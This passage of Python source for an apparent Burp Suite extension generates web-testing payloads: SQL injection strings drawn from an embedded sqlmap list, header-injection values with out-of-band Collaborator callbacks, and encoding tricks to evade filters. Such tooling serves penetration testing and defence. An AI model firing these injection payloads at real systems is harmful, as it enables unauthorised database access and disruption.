            self.launchThread(self.saveTextToFile, [self.sqliPayloadTextArea])
        else:
            print buttonText

    def generateSqliPayloads(self):
        """Write payloads to the text area"""
        payloadData = getSqlMapPayloads()
        dbms = [db for db in sqliDbmsToTest if sqliDbmsToTest[db]]
        tests = [test for test in sqliTechniques if sqliTechniques[test]]
        sqliPayloads = []

        for payload in payloadData:
            for db in dbms:
                for test in tests:
                    if (db.lower() in payload[0].lower() and test.lower() in payload[0].lower()):
                        sqliPayloads.append(payload[1])
        sqliPayloads = list(set(sqliPayloads))
        sqliPayloads = [self.substituteValues(payload) for payload in sqliPayloads]

        if self.sqliPrefixArea.text:
            sqliPayloads = [self.sqliPrefixArea.text + payload for payload in sqliPayloads]
        if self.sqliSuffixArea.text:
            sqliPayloads = [payload + self.sqliSuffixArea.text for payload in sqliPayloads]
        if sqliConfig['Non-standard percent encoding']:
            sqliPayloads = [percentNonStandardEncode(payload) for payload in sqliPayloads]
        if sqliConfig['Non-standard slash encoding']:
            sqliPayloads = [slashNonStandardEncode(payload) for payload in sqliPayloads]
        if sqliConfig['URL encode special chars']:
            sqliPayloads = [urlEncode(payload) for payload in sqliPayloads]
        if sqliConfig['Lower case']:
            sqliPayloads = [payload.lower() for payload in sqliPayloads]
        if sqliConfig['Toggle case']:
            sqliPayloads = [capsEveryOtherChar(payload) for payload in sqliPayloads]

        self.sqliPayloadTextArea.text = '\n'.join(sorted(list(set(sqliPayloads)), key=len))

    def handleHeadersSelectCheckBox(self, event):
        """Handles checkbox clicks from the Headers menu 
        header selection to ensure only payloads for 
        specified headers are generated.
        """
        if event.source.selected:
            headersToTest[event.source.text] = True
        else:
            headersToTest[event.source.text] = False

    def handleHeadersConfigCheckBox(self, event):
        """Handles heckbox clicks from the Headers menu config 
        selection to ensure only payloads are generated with 
        or without any specified options.
        """
        if event.source.selected:
            headersConfig[event.source.text] = True
        else:
            headersConfig[event.source.text] = False

    def handleHeadersTestsCheckBox(self, event):
        """Handles heckbox clicks from the Headers tab Tests 
        selection to ensure only payloads are generated with 
        or without any specified options.
        """
        if event.source.selected:
            headersTests[event.source.text] = True
        else:
            headersTests[event.source.text] = False

    def handleHeadersButtonClick(self, event):
        """Handles button clicks from header menu."""
        buttonText = event.source.text
        if buttonText == "Generate Payloads":
            self.launchThread(self.generateHeaderPayloads())
        elif buttonText == "Copy Payloads to Clipboard":
            self.copyToClipboard(self.headerPayloadTextArea.text)
        elif buttonText == 'Clear Payloads':
            self.clearTextArea(self.headerPayloadTextArea)
        elif buttonText == "Poll Collaborator Server":
            self.launchThread(self.pollCollabServer())            
        elif buttonText == "Save to File":
            self.launchThread(self.saveTextToFile, [self.headerPayloadTextArea])
        else:
            print buttonText

    def generateHeaderPayloads(self):
        """Write payloads to the text area"""
        payloads = []
        headers = [header for header in headersToTest if headersToTest[header]]
        tests = [test for test in headersTests if headersTests[test]]
        self.collab = []

        if self.customHeader1Area.text:
            headers.append(self.customHeader1Area.text)
        if self.customHeader2Area.text:
            headers.append(self.customHeader2Area.text)
        if self.customHeader3Area.text:
            headers.append(self.customHeader3Area.text)

        for header in headers:
            for test in tests:
                if test == "Random string reflection":
                    payloads.append(header + ': ' + getRandomString(10))
                if test == "Random long strings":
                    payloads.append(header + ': ' + getRandomString(25))
                    payloads.append(header + ': ' + getRandomString(50))
                    payloads.append(header + ': ' + getRandomString(100))
                    payloads.append(header + ': ' + getRandomString(500))
                    payloads.append(header + ': ' + getRandomString(1000))
                if test == "Error Invoking Characters":
                    payloads += [header + ': ' + char for char in list(string.punctuation)]
                if test == "Out-of-band":
                    if self.headersCallbackAddressArea.text:
                        payloads.append(header + ': ' + self.headersCallbackAddressArea.text)
                    else:
                        try:
                            self.collabPayload = self.callbacks.createBurpCollaboratorClientContext()
                            self.collab.append(self.collabPayload)
                            collabPayload = self.collabPayload.generatePayload(True)
                            payloads.append(header + ': ' + 'https://' + collabPayload)
                        except:
                            continue

            if self.headersCustomValue1Area.text:
                payloads.append(header + ': ' + self.headersCustomValue1Area.text)
            if self.headersCustomValue2Area.text:
                payloads.append(header + ': ' + self.headersCustomValue2Area.text)
            if header == "Authorization":
                payloads.append(header + ': Basic dGVzdHVzZXI6dGVzdHBhc3N3b3Jk')
                payloads.append(header + ': Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c')
                payloads.append(header + ': Digest username="Mufasa"')

        if headersConfig['Non-standard percent encoding']:
            payloads = [payload.split(':')[0] + ': ' + urlEncode(payload.split(': ')[1]) for payload in payloads]
        if headersConfig['Non-standard percent encoding']:
            payloads = [payload.split(':')[0] + ': ' + percentNonStandardEncode(payload.split(': ')[1]) for payload in payloads]
        if headersConfig['Non-standard slash encoding']:
            payloads = [payload.split(':')[0] + ': ' + percentNonStandardEncode(payload.split(': ')[1]) for payload in payloads]
        if headersConfig['Upper case']:
            payloads = [payload.split(':')[0] + ': ' + payload.split(': ')[1].upper() for payload in payloads]
        if headersConfig['Lower case']:
            payloads = [payload.split(':')[0] + ': ' + payload.split(': ')[1].lower() for payload in payloads]
        if headersConfig['Toggle case']:
            payloads = [payload.split(':')[0] + ': ' + capsEveryOtherChar(payload.split(': ')[1]) for payload in payloads]

        self.headerPayloadTextArea.text = '\n'.join(payloads)

    def handleCollabButtonClick(self, event):
        """Handles button clicks from Collaborator Interactions menu."""
        buttonText = event.source.text
        if buttonText == "Copy Interactions to Clipboard":
            self.copyToClipboard(self.collaboratorInteractionsTextArea.text)
        elif buttonText == 'Clear Log':
            self.clearTextArea(self.collaboratorInteractionsTextArea)
        elif buttonText == "Poll Collaborator Server":
            self.launchThread(self.pollCollabServer())            
        elif buttonText == "Save to File":
            self.launchThread(self.saveTextToFile, [self.collaboratorInteractionsTextArea])
        else:
            print buttonText

    def pollCollabServer(self):
        """Polls the collaborator server."""
        if self.collab:
            for collab in self.collab:    
                interactions = collab.fetchAllCollaboratorInteractions()
                if interactions:
                    for i in interactions:
                        props = i.properties
                        self.collaboratorInteractionsTextArea.append("Received interaction '{}' from {} at {} via {}\n".format(props['interaction_id'], props['client_ip'], props['time_stamp'], props['type']))

    def copyToClipboard(self, text):
        """Copies text to clipboard"""
        toolkit = Toolkit.getDefaultToolkit()
        clipboard = toolkit.getSystemClipboard()
        clipboard.setContents(StringSelection(text), None)

    def clearTextArea(self, obj):
        """Clears the text area of a specified object"""
        obj.text = ''

    def launchThread(self, targetFunction, arguments=None):
        """Launches a thread against a specified target function"""
        if arguments:
            t = threading.Thread(target=targetFunction, args=arguments)
        else:
            t = threading.Thread(target=targetFunction)
        t.daemon = True
        t.start()

    def saveTextToFile(self, obj):
        """Save the text of an obj to a file.
        Adapted from: https://github.com/PortSwigger/wordlist-extractor/blob/master/burpList.py
        """
        fileChooser = swing.JFileChooser()
        filter = FileNameExtensionFilter("Text Files",["txt"])
        fileChooser.setFileFilter(filter)
        choice = fileChooser.showSaveDialog(self.savePanel)
        if choice == swing.JFileChooser.APPROVE_OPTION:
            file = fileChooser.getSelectedFile()
            filepath = str(file.getCanonicalPath())
            with open(filepath, 'w') as fh:
                fh.write(obj.text)

    def substituteValues(self, sentence):
        """Substitutes values for the SQLMap placeholders."""
        if '[randnum' in sentence.lower():
            sentence = re.sub(r'\[RANDNUM\]', '{}'.format(random.randint(1,1000)), sentence, flags=re.IGNORECASE)
            sentence = re.sub(r'\[RANDNUM1\]', '{}'.format(random.randint(1,1000)), sentence, flags=re.IGNORECASE)
            sentence = re.sub(r'\[RANDNUM2\]', '{}'.format(random.randint(1,1000)), sentence, flags=re.IGNORECASE)
            sentence = re.sub(r'\[RANDNUM3\]', '{}'.format(random.randint(1,1000)), sentence, flags=re.IGNORECASE)
            sentence = re.sub(r'\[RANDNUM4\]', '{}'.format(random.randint(1,1000)), sentence, flags=re.IGNORECASE)
            sentence = re.sub(r'\[RANDNUM5\]', '{}'.format(random.randint(1,1000)), sentence, flags=re.IGNORECASE)
        if '[sleeptime' in sentence.lower():
            sentence = re.sub(r'\[SLEEPTIME\]', '{}'.format(random.randint(5,10)), sentence, flags=re.IGNORECASE)
        if '[randstr' in sentence.lower():
            sentence = re.sub(r'\[RANDSTR\]', '{}'.format(getRandomString(random.randint(5,10))), sentence, flags=re.IGNORECASE)
        if '[origvalue' in sentence.lower():
            sentence = re.sub(r'\[ORIGVALUE\]', '{}'.format(self.sqliOriginalParamArea.text), sentence, flags=re.IGNORECASE)
        if '[delimiter_start' in sentence.lower():
            sentence = re.sub(r'\[DELIMITER_START\]', '{}'.format(0x7176717a71), sentence, flags=re.IGNORECASE)
            sentence = re.sub(r'\[DELIMITER_STOP\]', '{}'.format(0x7171786a71), sentence, flags=re.IGNORECASE)
        return sentence

def urlEncode(string):
    """Returns a string where any reserved URL characters
    are percent encoded. 
    For example, <script> --> %3Cscript%3E"""
    return urllib.quote(string)

def percentNonStandardEncode(string):
    """Returns a string where any reserved URL characters
    are percent encoded using non standard encoding. 
    For example, <script> --> %u003Cscript%u003E"""
    urlEncString = urllib.quote(string)
    return re.sub(r'(%)([0-9a-fA-F]{2})', r'\g<1>u00\g<2>', urlEncString, flags=re.IGNORECASE)

def slashNonStandardEncode(string):
    """Returns a string where any reserved URL characters
    are percent encoded using non standard encoding. 
    For example, <script> --> %u003Cscript%u003E"""
    urlEncString = urllib.quote(string)
    nonStandardPercent = re.sub(r'(%)([0-9a-fA-F]{2})', r'\g<1>u00\g<2>', urlEncString, flags=re.IGNORECASE)
    return nonStandardPercent.replace('%', '\\')

def getRandomString(length):
    """Returns a random string of lowercase letters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def capsEveryOtherChar(word):
    """Returns a string with every other letter
    capitalized.
    https://stackoverflow.com/questions/17865563/capitalise-every-other-letter-in-a-string-in-python
    """
    ret = ""
    i = True  # capitalize
    for char in word:
        if i:
            ret += char.upper()
        else:
            ret += char.lower()
        if char != ' ':
            i = not i
    return ret

def getSqlMapPayloads():
    """Pulls in a ::: delimited string containing sqlmap payloads 
    and descriptions. Returns the data as a list of tuples.
    """
    contents = SQLMAP_DATA.split('\n')
    payload_data = []
    for line in contents:
        try:
            payload_data.append((line.split(':::')[0], line.split(':::')[1]))
        except Exception as e:
            print line
            continue
    return sorted(payload_data, key=lambda x: x[0])

# Data pulled from SqlMap XML files 3/14/2019
SQLMAP_DATA = """\
AND boolean-based blind - WHERE or HAVING clause:::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment):::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (MySQL comment):::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (comment):::AND [RANDNUM]=[RANDNUM]
AND boolean-based blind - WHERE or HAVING clause (subquery - comment):::AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Boolean-based blind - Parameter replace (CASE - original value):::(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)
Boolean-based blind - Parameter replace (CASE):::(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)
Boolean-based blind - Parameter replace (DUAL - original value):::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
Boolean-based blind - Parameter replace (DUAL):::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
Boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Firebird >= 2.0 AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird >= 2.0 AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird >= 2.0 OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird >= 2.0 OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Firebird AND error-based - WHERE or HAVING clause:::AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')
Firebird OR error-based - WHERE or HAVING clause:::OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')
Firebird error-based - ORDER BY clause:::,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
Firebird error-based - Parameter replace:::(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
Firebird inline queries:::SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE
Firebird stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4
Firebird stacked queries (heavy query):::;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4
Firebird time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
Generic UNION query (NULL) - 1 to 10 columns:::None
Generic UNION query (NULL) - 11 to 20 columns:::None
Generic UNION query (NULL) - 21 to 30 columns:::None
Generic UNION query (NULL) - 31 to 40 columns:::None
Generic UNION query (NULL) - 41 to 50 columns:::None
Generic UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom):::None
Generic UNION query ([CHAR]) - 1 to 10 columns:::None
Generic UNION query ([CHAR]) - 11 to 20 columns:::None
Generic UNION query ([CHAR]) - 21 to 30 columns:::None
Generic UNION query ([CHAR]) - 31 to 40 columns:::None
Generic UNION query ([CHAR]) - 41 to 50 columns:::None
Generic UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom):::None
Generic UNION query ([RANDNUM]) - 1 to 10 columns:::None
Generic UNION query ([RANDNUM]) - 11 to 20 columns:::None
Generic UNION query ([RANDNUM]) - 21 to 30 columns:::None
Generic UNION query ([RANDNUM]) - 31 to 40 columns:::None
Generic UNION query ([RANDNUM]) - 41 to 50 columns:::None
Generic UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom):::None
HAVING boolean-based blind - WHERE, GROUP BY clause:::HAVING [RANDNUM]=[RANDNUM]
HSQLDB > 2.0 AND time-based blind (heavy query - comment):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 AND time-based blind (heavy query):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 OR time-based blind (heavy query - comment):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 OR time-based blind (heavy query):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))
HSQLDB > 2.0 time-based blind - Parameter replace (heavy query):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))
HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 AND time-based blind (heavy query):::AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 OR time-based blind (heavy query):::OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
HSQLDB >= 1.7.2 stacked queries (heavy query - comment):::;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)
HSQLDB >= 1.7.2 stacked queries (heavy query):::;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)
HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)
HSQLDB >= 2.0 stacked queries (heavy query - comment):::;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
HSQLDB >= 2.0 stacked queries (heavy query):::;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)
IBM DB2 AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
IBM DB2 stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3
IBM DB2 stacked queries (heavy query):::;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3
IBM DB2 time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
Informix AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Informix boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)
Informix boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)
Informix time-based blind - Parameter replace (heavy query):::(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause:::,IIF([RANDNUM]=[RANDNUM],1,1/0)
Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value):::,IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)
Microsoft Access boolean-based blind - Parameter replace:::IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)
Microsoft Access boolean-based blind - Parameter replace (original value):::IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)
Microsoft Access boolean-based blind - Stacked queries:::;IIF([RANDNUM]=[RANDNUM],1,1/0)
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT):::AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT):::AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN):::AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT):::OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT):::OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN):::OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))
Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)
Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF):::;IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]
Microsoft SQL Server/Sybase error-based - ORDER BY clause:::,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
Microsoft SQL Server/Sybase error-based - Parameter replace:::(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
Microsoft SQL Server/Sybase error-based - Parameter replace (integer column):::(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase inline queries:::(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')
Microsoft SQL Server/Sybase stacked queries:::;WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase stacked queries (comment):::;WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase time-based blind (IF - comment):::WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase time-based blind (IF):::WAITFOR DELAY '0:0:[SLEEPTIME]'
Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))
MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL < 5.0 boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)
